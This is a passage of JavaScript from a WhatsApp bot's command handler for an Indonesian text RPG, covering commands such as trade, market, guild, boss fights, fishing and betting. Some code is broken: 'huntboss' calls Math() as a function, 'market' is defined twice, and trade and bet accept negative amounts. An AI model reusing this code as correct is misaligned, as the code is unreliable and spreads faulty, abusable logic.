    reply(`🏆 Boss dikalahkan!\n+500 💰\n+300 ⭐ EXP`)
  } else {
    reply(`😵 Boss terlalu kuat! Kamu gagal.`)
  }

  break
}
case 'trade': {
  initRpgUser(sender, pushname)
  if (!m.quoted) {
    reply(`reply pesan target trade.\nFormat: *trade itemnamanya* atau *trade 500* (koin)`)
    break
  }

  let targetId = m.quoted.sender
  initRpgUser(targetId)
  let user = rpgDb[sender]
  let target = rpgDb[targetId]

  if (!text) {
    reply(`Ketik item atau jumlah koin yang ingin kamu kirim.`)
    break
  }

  let jumlah = parseInt(text)
  if (!isNaN(jumlah)) {
    if (user.coin < jumlah) {
      reply(`Uangmu tidak cukup!`)
      break
    }
    user.coin -= jumlah
    target.coin += jumlah
    saveRpg()
    reply(`✅ Kamu mengirim ${jumlah} 💰 ke ${target.name}`)
  } else {
    let idx = user.inv.findIndex(i => i === text)
    if (idx === -1) {
      reply(`Kamu tidak punya item *${text}*`)
      break
    }
    user.inv.splice(idx, 1)
    target.inv.push(text)
    saveRpg()
    reply(`🎁 Kamu memberikan *${text}* ke ${target.name}`)
  }

  break
}
case 'rpgtop': {
  let list = Object.entries(rpgDb)
    .map(([id, u]) => ({ name: u.name, coin: u.coin }))
    .sort((a, b) => b.coin - a.coin)
    .slice(0, 10)
    .map((u, i) => `${i + 1}. ${u.name} - 💰 ${u.coin}`)
    .join('\n')

  reply(`🏆 *TOP 10 PEMAIN TERKAYA*\n\n${list}`)
  break
}
case 'profilerpg': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  
  let teks = `
╭───[ *🧍 PROFIL RPG* ]
│ 🎖️ Nama     : ${pushname}
│ 🆔 ID       : ${sender.split('@')[0]}
│ 🧪 Level    : ${user.level || 1}
│ ⚔️ Kelas    : ${user.class || 'Belum dipilih'}
│ 🌀 Elemen   : ${user.element || 'Netral'}
│ 🧠 Skill    : ${user.skill || 'Belum punya'}
│ ✨ Talent   : ${user.talent || 'Belum aktif'}
│ 📦 Pasif    : ${user.passive || 'Belum ada'}
│ 💫 Buff     : ${user.buff || '-'}
│ 🔥 Debuff   : ${user.debuff || '-'}

│ 💰 Coin     : ${user.coin || 0}
│ 🧾 EXP      : ${user.exp || 0}
│ 🎁 Limit    : ${user.limit || 0}
│ 🧤 Equip    : ${user.equip ? user.equip.join(', ') : 'Tidak ada'}
│ 🎒 Barang   : ${user.inv.length > 0 ? user.inv.join(', ') : 'Kosong'}

│ 📍 Lokasi   : ${user.location || 'Kota Awal'}
│ 🐴 Mount    : ${user.mount || 'Tidak ada'}
│ 🧿 Spirit   : ${user.spirit || 'Tidak aktif'}
│ 🧬 Status   : ${user.death ? 'Mati' : 'Hidup'}

│ 🏆 Medal    : ${user.medal || 0}
│ 📜 Prestige : ${user.prestige || 0}
╰───────────────`
  
  reply(teks)
  break
}
case 'upgrade': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]

  if (!user.weapon && !user.armor) {
    reply(`🔧 Kamu belum memakai senjata atau armor apa pun.`)
    break
  }

  if (user.coin < 300) {
    reply(`🔧 Butuh 300 koin untuk upgrade. Uangmu kurang!`)
    break
  }

  user.coin -= 300
  user.weapon &&= `${user.weapon}+1`
  user.armor &&= `${user.armor}+1`
  saveRpg()

  reply(`🛠️ Upgrade berhasil!\nSenjatamu menjadi: ${user.weapon}\nArmoremu menjadi: ${user.armor}`)
  break
}  
case 'storage': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  user.storage ||= []

  if (!text) {
    reply(`Ketik nama item yang ingin disimpan. Contoh: *storage ramuan*`)
    break
  }

  let idx = user.inv.indexOf(text)
  if (idx === -1) {
    reply(`Item *${text}* tidak ada di inventory.`)
    break
  }

  user.inv.splice(idx, 1)
  user.storage.push(text)
  saveRpg()

  reply(`📦 Kamu menyimpan *${text}* ke dalam gudang.`)
  break
}
case 'stash': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  user.storage ||= []

  if (!text) {
    let list = user.storage.length ? user.storage.map(i => `- ${i}`).join('\n') : '📭 Kosong'
    reply(`📦 *STORAGE*\n${list}\n\nKetik *stash itemmu* untuk mengambil.`)
    break
  }

  let idx = user.storage.indexOf(text)
  if (idx === -1) {
    reply(`Item *${text}* tidak ada di storage.`)
    break
  }

  user.storage.splice(idx, 1)
  user.inv.push(text)
  saveRpg()

  reply(`📤 Kamu mengambil *${text}* dari storage.`)
  break
}
case 'roleplay': {
  initRpgUser(sender, pushname)
  if (!text) {
    reply(`Ketik teks RP-mu. Contoh: *roleplay aku memeluk naga yang terluka...*`)
    break
  }

  reply(`🎭 *${pushname} beraksi:*\n_${text}_`)
  break
}
case 'questmap': {
  reply(`🗺️ *PETA QUEST DUNIA ALICE*

1. 🌲 Hutan Gelap — Kalahkan 3 serigala
2. 🏰 Kastil Retak — Temukan Pedang Warisan
3. 🌋 Gunung Lava — Bertahan dari Boss Api

Ketik *quest [nama]* untuk memulai (belum aktif sistem interaksinya)`)
  break
}
case 'market': {
  initRpgUser(sender, pushname)
  if (!text) {
    reply(`🛒 *MARKETPLACE*\nKetik: *market jual pedang 200* atau *market beli pedang*`)
    break
  }

  const [aksi, item, hargaStr] = text.split(' ')
  let harga = parseInt(hargaStr)
  let user = rpgDb[sender]

  if (aksi === 'jual') {
    if (!user.inv.includes(item)) return reply(`Kamu tidak punya *${item}* untuk dijual.`)
    if (isNaN(harga) || harga <= 0) return reply(`Harga tidak valid.`)

    global.market = global.market || []
    user.inv = user.inv.filter(i => i !== item)
    global.market.push({ seller: sender, item, harga })
    saveRpg()
    reply(`✅ Kamu menjual *${item}* seharga ${harga} 💰`)
    break
  }

  if (aksi === 'beli') {
    global.market = global.market || []
    let entry = global.market.find(e => e.item === item && e.seller !== sender)
    if (!entry) return reply(`Item *${item}* tidak tersedia di market.`)
    if (user.coin < entry.harga) return reply(`💸 Koinmu tidak cukup.`)

    let seller = rpgDb[entry.seller]
    user.coin -= entry.harga
    user.inv.push(entry.item)
    seller.coin += entry.harga

    global.market = global.market.filter(e => e !== entry)
    saveRpg()
    reply(`🛍️ Kamu membeli *${item}* dari market seharga ${entry.harga} 💰`)
    break
  }

  reply(`Perintah market tidak valid.`)
  break
}
case 'skill': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  user.skill ||= 'fireball'

  if (!text) {
    reply(`🔮 Skillmu: *${user.skill}*\nGunakan: *skill fireball @target*`)
    break
  }

  let targetId = m.quoted?.sender || text.split('@')[1]?.trim()?.replace(/[^0-9]/g, '')
  if (!targetId) return reply(`reply target atau sertakan @user.`)
  targetId = targetId.includes('@s.whatsapp.net') ? targetId : targetId + '@s.whatsapp.net'
  initRpgUser(targetId)

  let dmg = 70 + Math.floor(Math.random() * 30)
  let skillName = user.skill
  rpgDb[targetId].exp = Math.max(0, rpgDb[targetId].exp - dmg)

  saveRpg()
  reply(`🔥 *${pushname}* menggunakan *${skillName}* ke musuh!\n- ${dmg} EXP pada target.`)
  break
}
case 'element': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]

  if (user.element) {
    reply(`🔮 Elemenmu sudah dipilih: *${user.element}*`)
    break
  }

  const pilihan = ['api', 'air', 'tanah', 'angin']
  if (!text || !pilihan.includes(text.toLowerCase())) {
    reply(`Pilih elemen: *api*, *air*, *tanah*, *angin*\nContoh: *element api*`)
    break
  }

  user.element = text.toLowerCase()
  saveRpg()
  reply(`✅ Elemenmu kini: *${user.element}*`)
  break
}
case 'guild': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]

  if (!text) {
    reply(`🏰 Guild: ${user.guild || 'Tidak tergabung'}\nKetik *guild buat nama* atau *guild join nama*`)
    break
  }

  const [aksi, ...nama] = text.split(' ')
  const guildName = nama.join(' ')

  if (aksi === 'buat') {
    user.guild = guildName
    saveRpg()
    reply(`🏰 Kamu membuat guild *${guildName}*`)
    break
  }

  if (aksi === 'join') {
    user.guild = guildName
    saveRpg()
    reply(`🤝 Kamu bergabung ke guild *${guildName}*`)
    break
  }

  reply(`Format salah. Ketik *guild buat/join nama*`)
  break
}
case 'party': {
  initRpgUser(sender, pushname)
  global.partyList = global.partyList || {}

  if (!text) {
    let party = global.partyList[sender] || []
    let daftar = party.map((id, i) => `${i + 1}. ${rpgDb[id]?.name || 'Tidak dikenal'}`).join('\n') || 'Belum ada anggota.'
    reply(`👥 *PARTY-MU:*\n${daftar}`)
    break
  }

  if (m.quoted) {
    let target = m.quoted.sender
    initRpgUser(target)
    global.partyList[sender] ||= []
    if (!global.partyList[sender].includes(target)) {
      global.partyList[sender].push(target)
      reply(`✅ ${rpgDb[target].name} telah ditambahkan ke party-mu.`)
    } else {
      reply(`⚠️ Player sudah ada di party.`)
    }
    break
  }

  reply(`reply ke player yang ingin kamu ajak ke party.`)
  break
}
case 'death': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  if (user.hp && user.hp <= 0) {
    reply(`☠️ Kamu sudah mati! Gunakan *revive* untuk bangkit.`)
    break
  }

  user.hp = 0
  user.coin = Math.floor(user.coin * 0.5)
  reply(`☠️ Kamu tewas...\nKoinmu berkurang jadi ${user.coin}. Gunakan *revive* untuk hidup kembali.`)
  saveRpg()
  break
}
case 'revive': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  if (user.hp > 0) return reply(`❤️ Kamu masih hidup.`)

  if (user.coin < 200) return reply(`💰 Butuh 200 koin untuk hidup kembali.`)

  user.coin -= 200
  user.hp = 100
  saveRpg()
  reply(`💉 Kamu bangkit kembali dengan 100 HP.`)
  break
}
case 'itemuse': {
  initRpgUser(sender, pushname)
  if (!text) return reply(`Gunakan: *itemuse ramuan*`)

  let user = rpgDb[sender]
  let i = user.inv.indexOf(text)
  if (i === -1) return reply(`Item tidak ditemukan.`)

  if (text === 'ramuan') {
    user.hp = Math.min(user.hp + 50, 100)
    user.inv.splice(i, 1)
    saveRpg()
    reply(`🧪 Kamu meminum ramuan. HP-mu pulih jadi ${user.hp}`)
    break
  }

  reply(`Item *${text}* tidak bisa digunakan.`)
  break
}
case 'loot': {
  initRpgUser(sender, pushname)
  if (!m.quoted) return reply(`reply ke pesan musuh yang mati.`)
  let target = m.quoted.sender
  initRpgUser(target)

  let musuh = rpgDb[target]
  if (musuh.hp > 0) return reply(`🎯 Target masih hidup.`)

  if (musuh.inv.length === 0) return reply(`📭 Tidak ada barang untuk di-loot.`)

  let ambil = musuh.inv.splice(0, 1)[0]
  rpgDb[sender].inv.push(ambil)
  saveRpg()
  reply(`💰 Kamu berhasil mengambil *${ambil}* dari musuh.`)
  break
}
case 'elementatk': {
  initRpgUser(sender, pushname)
  if (!text || !m.quoted) return reply(`Gunakan: *elementatk [serangan]* (reply target)`)

  let user = rpgDb[sender]
  let elemen = user.element || 'tanpa elemen'
  let damage = 30 + (user.element === 'api' ? 20 : 0)

  let target = m.quoted.sender
  initRpgUser(target)
  rpgDb[target].hp -= damage
  saveRpg()
  reply(`🌪️ Kamu menyerang dengan elemen *${elemen}*!\nTarget kehilangan ${damage} HP.`)
  break
}
case 'worldevent': {
  let events = [
    '🌠 Hujan Meteor! Semua player +100 EXP!',
    '🌧️ Banjir besar! Semua bank player -20%',
    '🎁 Harta Karun Muncul! Gunakan *hunt* sekarang untuk dapat item langka!'
  ]
  let event = events[Math.floor(Math.random() * events.length)]

  for (let id in rpgDb) {
    if (event.includes('+100 EXP')) rpgDb[id].exp += 100
    if (event.includes('-20%')) rpgDb[id].bank = Math.floor(rpgDb[id].bank * 0.8)
  }

  saveRpg()
  reply(`🌍 *WORLD EVENT TERJADI!*\n\n${event}`)
  break
}
case 'alchemy': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  let bahan1 = 'kulit'
  let bahan2 = 'tulang'

  if (!user.inv.includes(bahan1) || !user.inv.includes(bahan2))
    return reply(`Kamu butuh ${bahan1} & ${bahan2}`)

  user.inv = user.inv.filter(i => i !== bahan1 && i !== bahan2)
  user.inv.push('ramuan')
  saveRpg()
  reply(`🧪 Kamu mencampur item dan menciptakan *ramuan*!`)
  break
}
case 'codex': {
  reply(`📜 *KODEX ITEM RPG*

- 🗡️ pedang → +atk
- 🛡️ armor → +def
- 🧪 ramuan → pulih HP
- 💀 tulang + kulit → ramuan (via *alchemy*)`)
  break
}
case 'npc': {
  let npcList = {
    'penjaga': '⚔️ Penjaga: Dunia ini berbahaya... simpan koinmu di bank!',
    'penjual': '🛒 Penjual: Aku punya ramuan langka, coba *shop*!'
  }

  if (!text || !npcList[text.toLowerCase()])
    return reply(`NPC tidak ditemukan. Coba: penjaga, penjual`)

  reply(npcList[text.toLowerCase()])
  break
}
case 'savepoint': {
  initRpgUser(sender, pushname)
  rpgDb[sender].savePoint = Date.now()
  saveRpg()
  reply(`💾 Kamu menyentuh *Save Point*. Progresmu disimpan.`)
  break
}
case 'class': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  if (user.class) return reply(`🧝‍♂️ Kamu sudah memilih kelas: *${user.class}*`)
  if (!text) return reply(`Kelas tersedia: *knight*, *mage*, *archer*`)

  let pilihan = ['knight', 'mage', 'archer']
  if (!pilihan.includes(text.toLowerCase())) return reply(`Kelas tidak valid.`)

  user.class = text.toLowerCase()
  saveRpg()
  reply(`✅ Kamu kini seorang *${user.class}*!`)
  break
}
case 'map': {
  let mapText = `
🗺️ *DUNIA RPG WHATSAPP*
• 🌲 Hutan Kabut
• ⛩️ Desa Hilang
• 🏰 Kastil Tua
• 🌋 Gunung Merapi
Gunakan: *travel lokasi*
`
  reply(mapText)
  break
}
case 'build': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  if (user.build) return reply(`🏠 Kamu sudah punya markas: *${user.build}*`)

  user.coin -= 500
  user.build = 'markas kayu'
  saveRpg()
  reply(`🧱 Kamu membangun *markas kayu*. (+rest, +safezone)`)
  break
}
case 'kingdom': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  if (user.kingdom) return reply(`👑 Kerajaanmu: *${user.kingdom}*`)

  if (!text) return reply(`Ketik: *kingdom nama_kerajaanmu*`)
  user.kingdom = text
  saveRpg()
  reply(`🏯 Kamu mendirikan kerajaan *${text}*!`)
  break
}
case 'stat': {
  initRpgUser(sender, pushname)
  let u = rpgDb[sender]
  reply(`📊 *STAT KARAKTER*
💪 ATK: ${u.weapon ? 30 : 10}
🛡️ DEF: ${u.armor ? 25 : 10}
⚡ SPD: ${u.class === 'archer' ? 20 : 10}
`)
  break
}
case 'medal': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  user.medal ||= []

  if (!user.medal.length) return reply(`🎖️ Kamu belum punya medali.`)

  reply(`🎖️ *MEDALI-MU:*\n${user.medal.map(m => `🏅 ${m}`).join('\n')}`)
  break
}
case 'mailbox': {
  initRpgUser(sender, pushname)
  global.mailbox ||= {}
  global.mailbox[sender] ||= []

  let mails = global.mailbox[sender]
  if (!mails.length) return reply(`📭 Kotak suratmu kosong.`)

  let teks = `💌 *MAILBOX:*\n` + mails.map((m, i) => `${i + 1}. Dari: ${m.from}\n📦: ${m.item}`).join('\n\n')
  reply(teks)
  break
}
case 'treasure': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  if (!user.inv.includes('kunci')) return reply(`🔐 Kamu butuh *kunci* untuk buka peti.`)

  user.inv = user.inv.filter(i => i !== 'kunci')
  user.inv.push('koin emas')
  saveRpg()
  reply(`🎉 Kamu membuka peti dan mendapatkan *koin emas*!`)
  break
}
case 'puzzle': {
  const teka = `❓ *TEKA-TEKI RPG*
Aku punya wajah tapi tak bisa melihat.
Aku punya tangan tapi tak bisa meraih.
Siapakah aku?`

  reply(teka)
  break
}
case 'darkmode': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  user.mode = 'dark'
  saveRpg()
  reply(`🌑 Kamu memasuki *DARK MODE RPG*... efek negatif meningkat di malam hari.`)
  break
}
case 'mine': {
  initRpgUser(sender, pushname)
  let item = Math.random() < 0.5 ? 'batu' : 'emas'
  rpgDb[sender].inv.push(item)
  saveRpg()
  reply(`⛏️ Kamu menambang dan mendapatkan *${item}*!`)
  break
}
case 'farm': {
  initRpgUser(sender, pushname)
  let hasil = ['gandum', 'apel'][Math.floor(Math.random() * 2)]
  rpgDb[sender].inv.push(hasil)
  saveRpg()
  reply(`🌾 Kamu memanen *${hasil}*!`)
  break
}
case 'season': {
  const musim = ['semi', 'panas', 'gugur', 'salju']
  const active = musim[Math.floor(Math.random() * musim.length)]
  global.rpgSeason = active
  reply(`📆 Musim saat ini adalah *${active.toUpperCase()}*.`)
  break
}
case 'weather': {
  const cuaca = ['cerah', 'hujan', 'badai', 'berkabut']
  const now = cuaca[Math.floor(Math.random() * cuaca.length)]
  global.rpgWeather = now
  reply(`🌦️ Cuaca hari ini: *${now.toUpperCase()}*`)
  break
}
case 'travel': {
  initRpgUser(sender, pushname)
  const lokasi = ['hutan', 'desa', 'gunung', 'kuil']
  if (!text || !lokasi.includes(text.toLowerCase())) {
    return reply(`🌍 Lokasi tersedia: ${lokasi.join(', ')}`)
  }
  rpgDb[sender].location = text.toLowerCase()
  saveRpg()
  reply(`🧭 Kamu berpindah ke *${text}*.`)
  break
}
case 'whereami': {
  initRpgUser(sender, pushname)
  let loc = rpgDb[sender].location || 'tidak diketahui'
  reply(`📍 Kamu berada di: *${loc}*`)
  break
}
case 'jobchange': {
  initRpgUser(sender, pushname)
  if (rpgDb[sender].level < 10) return reply(`🔒 Butuh level 10 untuk ganti class.`)
  rpgDb[sender].class = null
  saveRpg()
  reply(`🧠 Kamu dapat memilih class baru dengan perintah *class [nama]*`)
  break
}
case 'learnskill': {
  initRpgUser(sender, pushname)
  const skillList = ['fireball', 'heal', 'iceblast']
  if (!text || !skillList.includes(text)) return reply(`Skill tersedia: ${skillList.join(', ')}`)
  rpgDb[sender].skill = text
  saveRpg()
  reply(`🎓 Kamu mempelajari skill *${text}*`)
  break
}
case 'bossfight': {
  global.bossHp = global.bossHp || 500
  let dmg = 100 + Math.floor(Math.random() * 100)
  global.bossHp -= dmg
  if (global.bossHp <= 0) {
    global.bossHp = 0
    reply(`👑 Boss dikalahkan! Semua player +500 EXP`)
    for (let id in rpgDb) rpgDb[id].exp += 500
    saveRpg()
  } else {
    reply(`⚔️ Kamu menyerang boss dan memberi ${dmg} DMG.\nSisa HP Boss: ${global.bossHp}`)
  }
  break
}
case 'defend': {
  initRpgUser(sender, pushname)
  if (!rpgDb[sender].build) return reply(`🧱 Kamu belum punya markas.`)
  let bonus = 50
  rpgDb[sender].def += bonus
  saveRpg()
  reply(`🛡️ Kamu memperkuat markas. DEF bertambah ${bonus}`)
  break
}
case 'trap': {
  initRpgUser(sender, pushname)
  rpgDb[sender].trap = true
  saveRpg()
  reply(`🕳️ Kamu memasang jebakan di lokasi saat ini.`)
  break
}
case 'curse': {
  initRpgUser(sender, pushname)
  if (!m.quoted) return reply(`reply target untuk dikutuk.`)
  let target = m.quoted.sender
  initRpgUser(target)
  rpgDb[target].curse = true
  saveRpg()
  reply(`👻 Target telah dikutuk. Efek negatif akan aktif!`)
  break
}
case 'ward': {
  initRpgUser(sender, pushname)
  rpgDb[sender].ward = true
  saveRpg()
  reply(`🔆 Ward aktif. Lokasimu kini aman dari trap & curse.`)
  break
}
case 'prestige': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  if (user.level < 50) return reply(`📈 Minimal level 50 untuk prestige.`)

  user.level = 1
  user.exp = 0
  user.coin += 1000
  user.statBoost = (user.statBoost || 0) + 1
  saveRpg()
  reply(`🏅 Kamu melakukan *Prestige*! Stat boost permanen +1.`)
  break
}
case 'achieve': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  user.achieve ||= []
  if (!user.achieve.length) return reply(`🎖️ Kamu belum punya pencapaian.`)

  reply(`🏆 *Pencapaianmu:*\n${user.achieve.map((a, i) => `${i + 1}. ${a}`).join('\n')}`)
  break
}
case 'huntboss': {
  initRpgUser(sender, pushname)
  let dmg = Math.floor(Math() * 80) + 70
  global.bossHuntHp = global.bossHuntHp || 1000
  global.bossHuntHp -= dmg

  if (global.bossHuntHp <= 0) {
    global.bossHuntHp = 0
    reply(`🏆 Boss dikalahkan! Semua pemburu +1000 EXP`)
    for (let id in rpgDb) rpgDb[id].exp += 1000
    saveRpg()
  } else {
    reply(`🎯 Kamu serang boss, DMG: ${dmg}. Sisa HP: ${global.bossHuntHp}`)
  }
  break
}
case 'zombieevent': {
  for (let id in rpgDb) {
    rpgDb[id].hp = Math.max(1, rpgDb[id].hp - 20)
  }
  saveRpg()
  reply(`🧟 Wabah zombie! Semua pemain kehilangan 20 HP!`)
  break
}
case 'dragonraid': {
  global.dragonHp = global.dragonHp || 3000
  let dmg = 150 + Math.floor(Math.random() * 100)
  global.dragonHp -= dmg

  if (global.dragonHp <= 0) {
    global.dragonHp = 0
    for (let id in rpgDb) rpgDb[id].exp += 2000
    saveRpg()
    reply(`🐉 RAID BERHASIL! Semua player +2000 EXP!`)
  } else {
    reply(`🐉 Kamu serang naga! DMG: ${dmg}, Sisa HP: ${global.dragonHp}`)
  }
  break
}
case 'combo': {
  initRpgUser(sender, pushname)
  let u = rpgDb[sender]
  let comboDmg = u.class === 'knight' ? 100 : u.class === 'mage' ? 90 : 80
  reply(`🗡️ Kamu gunakan COMBO! DMG: ${comboDmg}`)
  break
}
case 'aim': {
  if (!m.quoted) return reply('reply target musuh.')
  let target = m.quoted.sender
  initRpgUser(target)
  rpgDb[target].hp -= 50
  saveRpg()
  reply(`🎯 Kamu membidik dan menyerang ${target}, -50 HP!`)
  break
}
case 'lore': {
  reply(`📖 *LORE DUNIA RPG*\nDi zaman kuno, 4 elemen bertarung merebut dunia...`)
  break
}
case 'riddle': {
  let soal = `❓ Aku punya kaki tapi tak bisa jalan. Siapa aku?`
  reply(soal)
  break
}
case 'codexitem': {
  reply(`📚 *KODEX ITEM:*\n- Ramuan: +50 HP\n- Kunci: Buka peti\n- Tulang: Bahan alchemy`)
  break
}
case 'fortify': {
  initRpgUser(sender, pushname)
  rpgDb[sender].def += 10
  saveRpg()
  reply(`🏗️ Markasmu diperkuat. DEF +10.`)
  break
}
case 'scout': {
  if (!m.quoted) return reply('reply target untuk diintai.')
  let target = m.quoted.sender
  initRpgUser(target)
  let loc = rpgDb[target].location || 'rahasia'
  reply(`🔍 Lokasi musuh: ${loc}`)
  break
}
case 'dailybox': {
  initRpgUser(sender, pushname)
  let u = rpgDb[sender]
  let now = Date.now()
  if (u.lastBox && now - u.lastBox < 86400000) return reply(`📦 Kamu sudah ambil hari ini.`)

  u.lastBox = now
  let hadiah = ['ramuan', 'kunci', 'fragmen'][Math.floor(Math.random() * 3)]
  u.inv.push(hadiah)
  saveRpg()
  reply(`🎁 Kamu mendapat *${hadiah}* dari kotak harian!`)
  break
}
case 'rift': {
  let efek = ['mendapatkan ramuan langka', 'kehilangan 50 HP']
  let acak = efek[Math.floor(Math.random() * efek.length)]
  reply(`🌀 Kamu memasuki portal...\nEfek: ${acak}`)
  break
}
case 'exchange': {
  initRpgUser(sender, pushname)
  if (!text || !rpgDb[sender].inv.includes(text)) return reply(`Kamu tidak punya item *${text}*`)
  rpgDb[sender].inv = rpgDb[sender].inv.filter(i => i !== text)
  rpgDb[sender].coin += 200
  saveRpg()
  reply(`🪙 Kamu tukar *${text}* jadi 200 koin.`)
  break
}
case 'rumor': {
  let r = ['💀 Penjaga Kuil telah bangkit!', '🎁 Event harta akan muncul besok!', '🌪️ Badai di Gunung Utara!']
  reply(`💬 *RUMOR TERSEBAR:*\n${r[Math.floor(Math.random() * r.length)]}`)
  break
}
case 'mutate': {
  initRpgUser(sender, pushname)
  let skill = ['firewave', 'windblast', 'darkspike']
  let acak = skill[Math.floor(Math.random() * skill.length)]
  rpgDb[sender].skill = acak
  saveRpg()
  reply(`🧬 Skillmu berubah menjadi *${acak}*`)
  break
}
case 'timetravel': {
  let kemungkinan = ['+200 EXP', '-100 coin', 'skip cooldown']
  let hasil = kemungkinan[Math.floor(Math.random() * kemungkinan.length)]
  reply(`⌛ Kamu menjelajah waktu...\nEfek: ${hasil}`)
  break
}
case 'spirit': {
  reply(`🪶 Kamu memanggil roh petarung! Dalam 1 jam ke depan, DMG +20.`)
  break
}
case 'stashall': {
  initRpgUser(sender, pushname)
  rpgDb[sender].storage = rpgDb[sender].storage || []
  rpgDb[sender].storage.push(...rpgDb[sender].inv)
  rpgDb[sender].inv = []
  saveRpg()
  reply(`📦 Semua item dipindah ke storage.`)
  break
}
case 'recycle': {
  initRpgUser(sender, pushname)
  if (!text || !rpgDb[sender].inv.includes(text)) return reply(`Item *${text}* tidak ada.`)
  rpgDb[sender].inv = rpgDb[sender].inv.filter(i => i !== text)
  rpgDb[sender].inv.push('fragmen')
  saveRpg()
  reply(`♻️ Item *${text}* dihancurkan jadi *fragmen*!`)
  break
}
case 'bless': {
  let buff = ['+10 ATK', '+20 DEF', '+15 HP']
  reply(`💠 Kamu diberkati hari ini!\nEfek: ${buff[Math.floor(Math.random() * buff.length)]}`)
  break
}
case 'passive': {
  initRpgUser(sender, pushname)
  let passive = rpgDb[sender].passive || 'Belum ada'
  reply(`🌀 *Skill Pasif:* ${passive}`)
  break
}
case 'skilltree': {
  initRpgUser(sender, pushname)
  reply(`🌳 *Skill Tree*\n- Fireball → Firestorm\n- Heal → Heal All\n- Slash → Blade Tornado`)
  break
}
case 'talent': {
  initRpgUser(sender, pushname)
  let kelas = rpgDb[sender].class || 'belum memilih'
  let teks = {
    knight: '⚔️ Damage +10 saat duel',
    mage: '🔮 Skill cooldown -10%',
    archer: '🏹 Critical +15%'
  }
  reply(`💡 *Talent Class ${kelas}:*\n${teks[kelas] || 'Belum tersedia'}`)
  break
}
case 'buff': {
  initRpgUser(sender, pushname)
  rpgDb[sender].buff = 'atk+10'
  saveRpg()
  reply(`🔆 Kamu menerima buff: ATK +10`)
  break
}
case 'debuff': {
  if (!m.quoted) return reply('reply target untuk diberi debuff.')
  let target = m.quoted.sender
  initRpgUser(target)
  rpgDb[target].debuff = 'burn'
  saveRpg()
  reply(`🔥 Musuh terkena efek *burn*!`)
  break
}
case 'cook': {
  initRpgUser(sender, pushname)
  if (!text) return reply('Masukkan nama resep: contoh `cook supikan`')
  rpgDb[sender].inv.push(`masakan:${text}`)
  saveRpg()
  reply(`🍲 Kamu memasak *${text}*!`)
  break
}
case 'fish': {
  initRpgUser(sender, pushname)
  let hasil = ['ikan biasa', 'ikan langka', 'ikan emas']
  let tangkapan = hasil[Math.floor(Math.random() * hasil.length)]
  rpgDb[sender].inv.push(tangkapan)
  saveRpg()
  reply(`🎣 Kamu memancing dan mendapatkan *${tangkapan}*!`)
  break
}
case 'huntwild': {
  initRpgUser(sender, pushname)
  let hewan = ['rusa', 'kelinci', 'beruang']
  let target = hewan[Math.floor(Math.random() * hewan.length)]
  rpgDb[sender].inv.push(`daging ${target}`)
  saveRpg()
  reply(`🏹 Kamu berburu dan mendapatkan *daging ${target}*`)
  break
}
case 'trapwild': {
  initRpgUser(sender, pushname)
  rpgDb[sender].trapwild = true
  saveRpg()
  reply(`🪤 Jebakan hewan liar telah dipasang.`)
  break
}
case 'mount': {
  initRpgUser(sender, pushname)
  rpgDb[sender].mount = 'kuda'
  saveRpg()
  reply(`🐎 Kamu naik *kuda* dan bisa menjelajah lebih cepat!`)
  break
}
case 'summon': {
  initRpgUser(sender, pushname)
  rpgDb[sender].summon = 'golem batu'
  saveRpg()
  reply(`🧟 Kamu memanggil *golem batu* untuk bertarung bersamamu!`)
  break
}
case 'arena': {
  reply(`🏟️ *Arena PvP* terbuka!\nGunakan: duel @user\nPemenang mendapat 500 EXP!`)
  break
}
case 'bet': {
  initRpgUser(sender, pushname)
  if (!text) return reply('Masukkan jumlah coin: contoh `bet 500`')
  let jumlah = parseInt(text)
  if (isNaN(jumlah)) return reply('Jumlah tidak valid.')
  rpgDb[sender].coin -= jumlah
  saveRpg()
  reply(`🎲 Kamu bertaruh ${jumlah} coin di arena.`)
  break
}
case 'market': {
  reply(`🛒 *Market Fitur*\n- Gunakan: trade @user item\n- Lihat penawaran: marketlist`)
  break
}
case 'bounty': {
  initRpgUser(sender, pushname)
  if (!text) return reply('Gunakan: bounty @user jumlah')
  let [mention, jumlah] = text.split(' ')
  if (!mention || isNaN(jumlah)) return reply('Format salah. Contoh: bounty @target 1000')
  rpgDb.bounty ||= {}
  rpgDb.bounty[mention] = parseInt(jumlah)
  saveRpg()
  reply(`💰 Kamu pasang buronan ${mention} sebesar ${jumlah} coin!`)
  break
}
case 'spy': {
  if (!m.quoted) return reply('reply target yang ingin diintai.')
  let target = m.quoted.sender
  initRpgUser(target)
  let lokasi = rpgDb[target].location || 'tidak diketahui'
  reply(`🕵️ Target berada di: *${lokasi}*`)
  break
}
case 'forage': {
  initRpgUser(sender, pushname)
  let tanaman = ['herba', 'akar ajaib', 'jamur emas']
  let item = tanaman[Math.floor(Math.random() * tanaman.length)]
  rpgDb[sender].inv.push(item)
  saveRpg()
  reply(`🌿 Kamu menemukan *${item}*!`)
  break
}
case 'cookbook': {
  reply(`📖 *Resep Masakan:*\n- supikan = ikan + air\n- nasiherba = nasi + herba`)
  break
}
case 'blessnpc': {
  initRpgUser(sender, pushname)
  let bonus = ['+10 HP', '+5 DEF', '+100 EXP']
  let buff = bonus[Math.floor(Math.random() * bonus.length)]
  reply(`✨ NPC memberkati kamu!\nEfek: ${buff}`)
  break
}
case 'mountfeed': {
  initRpgUser(sender, pushname)
  reply(`🧲 Tungganganmu diberi makan dan merasa bahagia.`)
  break
}
case 'research': {
  initRpgUser(sender, pushname)
  let skill = rpgDb[sender].skill || 'tidak ada'
  rpgDb[sender].skill = skill + '+'
  saveRpg()
